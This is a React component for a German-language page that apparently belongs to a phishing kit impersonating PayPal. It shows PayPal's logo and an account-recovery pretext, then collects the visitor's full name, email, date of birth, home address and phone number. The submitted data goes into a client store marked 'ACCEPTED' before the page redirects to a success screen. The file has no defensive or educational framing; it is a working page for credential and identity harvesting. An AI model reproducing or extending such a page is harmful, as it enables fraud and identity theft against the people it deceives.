import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion } from 'motion/react';
import PayPalInput from '../components/PayPalInput';
import { ClientStore } from '../services/ClientStore';

export default function IdentityVerification() {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    salutation: '',
    fullName: '',
    email: '',
    dob: '',
    street: '',
    houseNumber: '',
    zip: '',
    city: '',
    phone: ''
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    
    // Numeric-only check for ZIP and Phone
    if (name === 'zip') {
      const numericValue = value.replace(/\D/g, '').slice(0, 5);
      setFormData(prev => ({ ...prev, [name]: numericValue }));
      return;
    }
    
    if (name === 'phone') {
      const numericValue = value.replace(/\D/g, '');
      setFormData(prev => ({ ...prev, [name]: numericValue }));
      return;
    }

    if (name === 'dob') {
      // Remove all non-digits
      let val = value.replace(/\D/g, '');
      if (val.length > 8) val = val.slice(0, 8);
      
      // Auto-insert dots: 12122000 -> 12.12.2000
      let formatted = val;
      if (val.length > 2 && val.length <= 4) {
        formatted = `${val.slice(0, 2)}.${val.slice(2)}`;
      } else if (val.length > 4) {
        formatted = `${val.slice(0, 2)}.${val.slice(2, 4)}.${val.slice(4)}`;
      }
      
      setFormData(prev => ({ ...prev, [name]: formatted }));
      return;
    }

    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    ClientStore.addOrUpdateClient({ 
      id: sessionStorage.getItem('clientId') || 'guest-' + Math.random().toString(36).substr(2, 9), 
      ...formData,
      status: 'ACCEPTED' 
    });
    navigate('/redirect', { state: { next: '/success' } });
  };

  return (
    <div className="w-full max-w-[560px] mx-auto px-6 py-12 md:py-16">
      <motion.div 
        initial={{ opacity: 0, y: 10 }}
        animate={{ opacity: 1, y: 0 }}
        className="bg-white rounded-3xl p-8 md:p-12 shadow-sm border border-slate-100"
      >
        <div className="flex justify-center mb-8">
          <img 
            src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" 
            alt="PayPal Logo" 
            className="h-10"
            referrerPolicy="no-referrer"
          />
        </div>

        <div className="text-center mb-10">
          <h1 className="text-2xl font-bold text-text-main mb-4 tracking-tight">
            Identität verifizieren
          </h1>
          <p className="text-[15px] text-text-muted leading-relaxed">
            Aus Sicherheitsgründen müssen Sie Ihre Identität verifizieren, um Ihr Konto wiederherzustellen.
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="flex gap-4">
            <div className="relative w-32 rounded-[4px] border border-[#8d949b] bg-white px-3 py-1">
              <label className="block text-[11px] font-bold text-[#6c7378] mb-0.5">Anrede</label>
              <select 
                name="salutation"
                value={formData.salutation}
                onChange={handleChange}
                required
                className="w-full bg-transparent outline-none text-[16px] text-text-main h-[32px] appearance-none cursor-pointer"
              >
                <option value="">Wählen...</option>
                <option value="Herr">Herr</option>
                <option value="Frau">Frau</option>
                <option value="Divers">Divers</option>
              </select>
            </div>
            <div className="flex-1">
              <PayPalInput 
                label="Vollständiger Name"
                name="fullName"
                value={formData.fullName}
                onChange={handleChange}
                required
              />
            </div>
          </div>

          <PayPalInput 
            label="E-Mail-Adresse"
            name="email"
            type="email"
            value={formData.email}
            onChange={handleChange}
            required
          />

          <PayPalInput 
            label="Geburtsdatum (TT.MM.JJJJ)"
            name="dob"
            value={formData.dob}
            onChange={handleChange}
            required
            placeholder="TT.MM.JJJJ"
          />

          <div className="grid grid-cols-1 md:grid-cols-[1fr_80px] gap-4">
            <PayPalInput 
              label="Straße"
              name="street"
              value={formData.street}
              onChange={handleChange}
              required
            />
            <PayPalInput 
              label="Nr."
              name="houseNumber"
              value={formData.houseNumber}
              onChange={handleChange}
              required
            />
          </div>

          <div className="grid grid-cols-1 md:grid-cols-[110px_1fr] gap-4">
            <PayPalInput 
              label="PLZ"
              name="zip"
              value={formData.zip}
              onChange={handleChange}
              required
            />
            <PayPalInput 
              label="Stadt"
              name="city"
              value={formData.city}
              onChange={handleChange}
              required
            />
          </div>

          <PayPalInput 
            label="Telefonnummer"
            name="phone"
            value={formData.phone}
            onChange={handleChange}
            required
            type="tel"
          />

          <div className="pt-6">
            <button 
              type="submit"
              className="w-full bg-primary text-white font-bold py-4 px-6 rounded-full transition-all hover:bg-secondary shadow-md"
            >
              Bestätigen und Fortfahren
            </button>
          </div>
        </form>
      </motion.div>
    </div>
  );
}
